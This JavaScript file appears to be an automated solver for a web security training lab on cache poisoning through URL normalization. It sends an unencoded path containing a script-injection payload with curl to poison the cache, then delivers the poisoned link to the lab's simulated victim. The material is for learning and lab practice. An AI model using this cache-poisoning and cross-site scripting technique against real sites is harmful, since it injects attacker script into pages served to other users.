const { execFile } = require('node:child_process');
const { promisify } = require('node:util');
const { runLab, isSolved } = require('./_common.cjs');

const execFileAsync = promisify(execFile);
const TITLE = 'URL normalization';
const PATH = '/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-normalization';

async function rawGet(url) {
  await execFileAsync('curl', ['-ksS', '--path-as-is', url], { maxBuffer: 1024 * 1024 * 5 });
}

async function waitSolved(page, labUrl, attempts = 10, delay = 5000) {
  for (let i = 0; i < attempts; i += 1) {
    if (await isSolved(page, labUrl)) return true;
    await page.waitForTimeout(delay);
  }
  return false;
}

async function deliverLink(page, labUrl, attackUrl) {
  const handler = async (dialog) => {
    if (dialog.type() === 'prompt') {
      await dialog.accept(attackUrl).catch(() => {});
      return;
    }
    await dialog.accept().catch(() => {});
  };
  page.on('dialog', handler);
  try {
    await page.goto(labUrl, { waitUntil: 'domcontentloaded', timeout: 15000 }).catch(() => {});
    await page.getByRole('button', { name: /deliver link to victim/i }).click({ timeout: 5000 });
    await page.waitForTimeout(1500);
  } finally {
    page.off('dialog', handler);
  }
}

runLab({
  title: TITLE,
  path: PATH,
  solve: async ({ page, labUrl }) => {
    const rawPath = '/random</p><script>alert(1)</script><p>foo';
    const attackUrl = `${labUrl}${encodeURI(rawPath)}`;

    await rawGet(`${labUrl}${rawPath}`);
    page.once('dialog', (dialog) => dialog.accept().catch(() => {}));
    await page.goto(attackUrl, { waitUntil: 'domcontentloaded', timeout: 15000 });
    await page.waitForTimeout(1000);
    await rawGet(`${labUrl}${rawPath}`);
    await deliverLink(page, labUrl, attackUrl);
    await waitSolved(page, labUrl, 8, 5000);
  },
});
